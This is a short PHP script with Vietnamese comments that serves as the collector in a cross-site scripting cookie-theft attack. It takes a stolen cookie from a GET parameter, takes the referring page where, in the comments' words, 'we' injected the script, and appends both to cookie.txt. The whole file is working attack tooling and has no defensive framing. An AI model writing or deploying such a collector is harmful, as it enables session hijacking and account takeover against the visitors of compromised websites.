<?php
    if(isset($_GET['cookie']))
    {
        $cookie = $_GET['cookie'];
    // Mởfile cookie.txt, tham sốa nghĩa là file này mởchỉđểwrite chứkhông scan hay read
    $f=fopen('cookie.txt','a');
    // Ta write địa chỉtrang web mà ởtrang đó bịta chèn script.
    fwrite($f,$_SERVER['HTTP_REFERER']);
     // Ghi giá trịcookie
     fwrite($f,". Cookie la: ".$cookie." \n");
     // Đóng file lại
     fclose($f);
    }
     ?>